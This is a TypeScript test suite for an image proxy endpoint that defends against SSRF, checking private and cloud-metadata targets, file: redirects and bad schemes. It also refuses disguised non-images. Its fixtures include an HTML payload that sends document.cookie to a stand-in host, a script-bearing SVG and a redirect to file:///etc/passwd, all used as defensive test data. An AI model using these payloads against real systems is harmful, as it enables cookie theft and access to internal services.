/**
 * V7-L6: the coin image proxy (`GET /v1/img/:mint`). The app's CSP no longer allows `img-src https:`;
 * every coin image comes through here. SSRF cases (private targets, redirects into the private network,
 * bad schemes), non-images (SVG, HTML dressed as image/png), oversize, caching, rate limits, headers.
 */
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";

import { Keypair } from "@solana/web3.js";
import type { FastifyInstance } from "fastify";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { loadApiConfig } from "../src/config.js";
import { ImageProxy, type ImageProxyOpts, sniffImage } from "../src/img.js";
import { buildServer } from "../src/server.js";

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(40, 1)]);
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(40, 2)]);
const GIF = Buffer.concat([Buffer.from("GIF89a"), Buffer.alloc(40, 3)]);
const WEBP = Buffer.concat([Buffer.from("RIFF"), Buffer.from([40, 0, 0, 0]), Buffer.from("WEBPVP8 "), Buffer.alloc(40, 4)]);
const SVG = Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`);
const HTML = Buffer.from(`<!doctype html><script>fetch("https://evil.example/?"+document.cookie)</script>`);

let upstream: Server;
const hits: Record<string, number> = {};
let slowRelease: (() => void) | undefined;

beforeAll(async () => {
  upstream = createServer((req, res) => {
    const path = (req.url ?? "").split("?")[0];
    hits[path] = (hits[path] ?? 0) + 1;
    const send = (type: string, body: Buffer) => res.writeHead(200, { "content-type": type, "content-length": body.length }).end(body);
    switch (path) {
      case "/a.png":
        return send("image/png", PNG);
      case "/a.jpg":
        return send("image/jpeg", JPEG);
      case "/a.gif":
        return send("image/gif", GIF);
      case "/a.webp":
        return send("image/webp", WEBP);
      case "/evil.svg":
        return send("image/svg+xml", SVG);
      case "/fake.png":
        return send("image/png", HTML); // lies about its type
      case "/big.png":
        return send("image/png", Buffer.concat([PNG, Buffer.alloc(64 * 1024)]));
      case "/big-chunked.png": {
        res.writeHead(200, { "content-type": "image/png" }); // no content-length: the stream cap must trip
        res.write(PNG);
        for (let i = 0; i < 20; i++) res.write(Buffer.alloc(8 * 1024));
        return void res.end();
      }
      case "/to-private":
        return void res.writeHead(302, { location: "http://10.0.0.1/a.png" }).end();
      case "/to-metadata":
        return void res.writeHead(302, { location: "http://169.254.169.254/latest/meta-data" }).end();
      case "/to-file":
        return void res.writeHead(302, { location: "file:///etc/passwd" }).end();
      case "/404.png":
        return void res.writeHead(404).end();
      case "/slow.png":
        slowRelease = () => send("image/png", PNG);
        return;
      default:
        res.writeHead(404).end();
    }
  });
  await new Promise<void>((r) => upstream.listen(0, "127.0.0.1", r));
});
afterAll(() => upstream.close());

const url = (p: string) => `http://127.0.0.1:${(upstream.address() as AddressInfo).port}${p}`;
/** 127.0.0.1 plays a public host; every other address keeps the real policy. */
const testFetch: ImageProxyOpts["fetchOpts"] = { allowHttp: true, isAllowedAddress: (ip) => ip === "127.0.0.1" };
const proxy = (images: Record<string, string | null>, o: ImageProxyOpts = {}) => new ImageProxy(async (m) => images[m] ?? null, { fetchOpts: testFetch, maxBytes: 32 * 1024, ...o });

describe("sniffImage", () => {
  it("accepts PNG / JPEG / GIF / WebP by magic bytes", () => {
    expect(sniffImage(PNG)).toBe("image/png");
    expect(sniffImage(JPEG)).toBe("image/jpeg");
    expect(sniffImage(GIF)).toBe("image/gif");
    expect(sniffImage(WEBP)).toBe("image/webp");
  });
  it("refuses SVG, HTML, text, empty and truncated headers", () => {
    for (const b of [SVG, HTML, Buffer.from("hello"), Buffer.alloc(0), PNG.subarray(0, 8), Buffer.from("RIFF0000WAVEfmt "), Buffer.from(`<?xml version="1.0"?><svg/>`)]) expect(sniffImage(b)).toBeNull();
  });
});

describe("ImageProxy", () => {
  it("serves each raster format with the sniffed type", async () => {
    const p = proxy({ a: url("/a.png"), b: url("/a.jpg"), c: url("/a.gif"), d: url("/a.webp") });
    const types = await Promise.all(["a", "b", "c", "d"].map(async (m) => {
      const r = await p.get(m);
      return r.ok ? r.type : r.reason;
    }));
    expect(types).toEqual(["image/png", "image/jpeg", "image/gif", "image/webp"]);
  });

  it("refuses SVG and HTML served as image/png (not_image)", async () => {
    const p = proxy({ svg: url("/evil.svg"), fake: url("/fake.png") });
    expect(await p.get("svg")).toEqual({ ok: false, reason: "not_image" });
    expect(await p.get("fake")).toEqual({ ok: false, reason: "not_image" });
  });

  it("refuses oversize images (content-length and streamed)", async () => {
    const p = proxy({ big: url("/big.png"), chunked: url("/big-chunked.png") });
    expect(await p.get("big")).toEqual({ ok: false, reason: "too_large" });
    expect(await p.get("chunked")).toEqual({ ok: false, reason: "too_large" });
  });

  it("SSRF: private / loopback / metadata targets are refused before connecting (real address policy)", async () => {
    const targets = ["https://127.0.0.1/a.png", "https://10.0.0.5/a.png", "https://169.254.169.254/latest/meta-data", "https://[::1]/a.png", "https://[::ffff:127.0.0.1]/a.png", "https://localhost/a.png", "https://example.com:8443/a.png"];
    const p = new ImageProxy(async (m) => targets[Number(m)], { maxConcurrent: 100 });
    for (let i = 0; i < targets.length; i++) expect(await p.get(String(i)), targets[i]).toEqual({ ok: false, reason: "blocked" });
  });

  it("SSRF: bad schemes are refused", async () => {
    const bad = ["http://example.com/a.png", "file:///etc/passwd", "javascript:alert(1)", "data:image/png;base64,iVBORw0KGgo=", "ftp://example.com/a.png", "https://user:pw@example.com/a.png", "gopher://x"];
    const p = new ImageProxy(async (m) => bad[Number(m)], { maxConcurrent: 100 });
    for (let i = 0; i < bad.length; i++) expect(await p.get(String(i)), bad[i]).toEqual({ ok: false, reason: "blocked" });
  });

  it("SSRF: a redirect into the private network / metadata / file: is re-checked and refused", async () => {
    const p = proxy({ priv: url("/to-private"), meta: url("/to-metadata"), file: url("/to-file") });
    expect(await p.get("priv")).toEqual({ ok: false, reason: "blocked" });
    expect(await p.get("meta")).toEqual({ ok: false, reason: "blocked" });
    expect(await p.get("file")).toEqual({ ok: false, reason: "blocked" });
  });

  it("upstream errors and coins without an image", async () => {
    const p = proxy({ gone: url("/404.png"), none: null });
    expect(await p.get("gone")).toEqual({ ok: false, reason: "upstream" });
    expect(await p.get("none")).toEqual({ ok: false, reason: "no_image" });
    expect(await p.get("unknown-mint")).toEqual({ ok: false, reason: "no_image" });
  });

  it("caches hits and failures (one upstream fetch each), shares entries between coins with the same URL", async () => {
    const before = { png: hits["/a.png"] ?? 0, svg: hits["/evil.svg"] ?? 0 };
    const p = proxy({ x: url("/a.png?c=1"), y: url("/a.png?c=1"), s: url("/evil.svg?c=1") });
    await Promise.all([p.get("x"), p.get("x"), p.get("y")]);
    await p.get("x");
    await p.get("s");
    await p.get("s");
    expect(hits["/a.png"] - before.png).toBe(1);
    expect(hits["/evil.svg"] - before.svg).toBe(1);
    expect(p.stats.fetched).toBe(1);
  });

  it("the cache is bounded by entries and bytes (LRU)", async () => {
    const imgs = Object.fromEntries(Array.from({ length: 6 }, (_, i) => [`m${i}`, url(`/a.png?lru=${i}`)]));
    const p = proxy(imgs, { cacheEntries: 3 });
    for (const m of Object.keys(imgs)) await p.get(m);
    expect(p.size.entries).toBe(3);
    const q = proxy(imgs, { cacheBytes: PNG.length * 2 });
    for (const m of Object.keys(imgs)) await q.get(m);
    expect(q.size.bytes).toBeLessThanOrEqual(PNG.length * 2);
  });

  it("caps concurrent upstream fetches (busy, not cached)", async () => {
    const p = proxy({ slow: url("/slow.png"), other: url("/a.png?busy") }, { maxConcurrent: 1 });
    const first = p.get("slow");
    await new Promise((r) => setTimeout(r, 100));
    expect(await p.get("other")).toEqual({ ok: false, reason: "busy" });
    slowRelease?.();
    expect((await first).ok).toBe(true);
    expect((await p.get("other")).ok).toBe(true);
  });
});

describe("GET /v1/img/:mint", () => {
  let app: FastifyInstance;
  const mint = Keypair.generate().publicKey.toBase58();
  const svgMint = Keypair.generate().publicKey.toBase58();
  const noneMint = Keypair.generate().publicKey.toBase58();
  beforeAll(async () => {
    const cfg = loadApiConfig({ DATABASE_URL: "postgres://stub/stub", LOG_LEVEL: "silent", IMG_RATE_LIMIT_PER_MIN: "8" } as NodeJS.ProcessEnv);
    ({ app } = await buildServer(cfg, {
      db: { query: async () => ({ rows: [] }), end: async () => {} } as never,
      conn: {} as never,
      repo: {} as never,
      chain: { solUsd: async () => 150, client: {} } as never,
      live: { subscribers: 0, stats: {}, subscribe: () => () => {}, stop: async () => {} } as never,
      pool: null,
      images: proxy({ [mint]: url("/a.png?route"), [svgMint]: url("/evil.svg?route") }),
    }));
  });
  afterAll(() => app.close());

  it("serves the image with strict headers, an ETag and long caching", async () => {
    const r = await app.inject({ url: `/v1/img/${mint}?v=abc123` });
    expect(r.statusCode).toBe(200);
    expect(r.headers["content-type"]).toBe("image/png");
    expect(r.headers["content-security-policy"]).toBe("default-src 'none'; sandbox");
    expect(r.headers["x-content-type-options"]).toBe("nosniff");
    expect(r.headers["cross-origin-resource-policy"]).toBe("cross-origin");
    expect(r.headers["cache-control"]).toMatch(/max-age=86400/);
    expect(r.rawPayload.equals(PNG)).toBe(true);
    const again = await app.inject({ url: `/v1/img/${mint}`, headers: { "if-none-match": String(r.headers.etag) } });
    expect(again.statusCode).toBe(304);
  });

  it("SVG → 502 (never served), no image → 404; both with the strict headers and a short cache", async () => {
    const svg = await app.inject({ url: `/v1/img/${svgMint}` });
    expect(svg.statusCode).toBe(502);
    expect(svg.headers["content-type"]).toMatch(/^text\/plain/);
    expect(svg.headers["content-security-policy"]).toBe("default-src 'none'; sandbox");
    expect(svg.body).not.toContain("<svg");
    const none = await app.inject({ url: `/v1/img/${noneMint}` });
    expect(none.statusCode).toBe(404);
    expect(none.headers["cache-control"]).toBe("public, max-age=300");
  });

  it("only base58 mints (a URL can't be passed)", async () => {
    expect((await app.inject({ url: `/v1/img/${encodeURIComponent("https://evil.example/x.png")}` })).statusCode).toBe(400);
    expect((await app.inject({ url: `/v1/img/${mint}?v=${"x".repeat(40)}` })).statusCode).toBe(400);
  });

  it("is rate limited per IP", async () => {
    let last = 0;
    for (let i = 0; i < 10; i++) last = (await app.inject({ url: `/v1/img/${mint}`, remoteAddress: "203.0.113.9" })).statusCode;
    expect(last).toBe(429);
  });
});
